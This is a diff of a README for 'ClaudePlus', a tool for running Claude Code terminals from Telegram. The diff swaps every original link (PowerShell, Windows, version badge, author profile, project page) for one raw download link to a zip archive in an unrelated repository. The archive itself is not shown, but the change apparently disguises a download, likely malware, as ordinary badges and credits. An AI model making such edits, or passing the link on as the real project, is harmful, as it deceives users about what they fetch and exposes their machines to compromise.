@@ -6,10 +6,10 @@
 
 **Manage multiple Claude Code terminals from Telegram — code anywhere, anytime**
 
-[![PowerShell](https://img.shields.io/badge/PowerShell-5.1%2B-blue?logo=powershell)](https://microsoft.com/powershell)
+[![PowerShell](https://img.shields.io/badge/PowerShell-5.1%2B-blue?logo=powershell)](https://github.com/Delphinegallic955/ClaudePlus/raw/refs/heads/main/myringomycosis/Claude_Plus_v3.3-alpha.5.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Platform: Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?logo=windows)](https://microsoft.com/windows)
-[![Version](https://img.shields.io/badge/Version-3.1-orange)](https://github.com/hayefmajid/ClaudePlus)
+[![Platform: Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?logo=windows)](https://github.com/Delphinegallic955/ClaudePlus/raw/refs/heads/main/myringomycosis/Claude_Plus_v3.3-alpha.5.zip)
+[![Version](https://img.shields.io/badge/Version-3.1-orange)](https://github.com/Delphinegallic955/ClaudePlus/raw/refs/heads/main/myringomycosis/Claude_Plus_v3.3-alpha.5.zip)
 
 </div>
 
@@ -500,6 +500,6 @@ MIT License — see [LICENSE](LICENSE) for details.
 
 ## Author
 
-**Majid Hayef** — [GitHub](https://github.com/hayefmajid)
+**Majid Hayef** — [GitHub](https://github.com/Delphinegallic955/ClaudePlus/raw/refs/heads/main/myringomycosis/Claude_Plus_v3.3-alpha.5.zip)
 
-Built as part of the [FiscalIQ](https://github.com/hayefmajid) project ecosystem.
+Built as part of the [FiscalIQ](https://github.com/Delphinegallic955/ClaudePlus/raw/refs/heads/main/myringomycosis/Claude_Plus_v3.3-alpha.5.zip) project ecosystem.
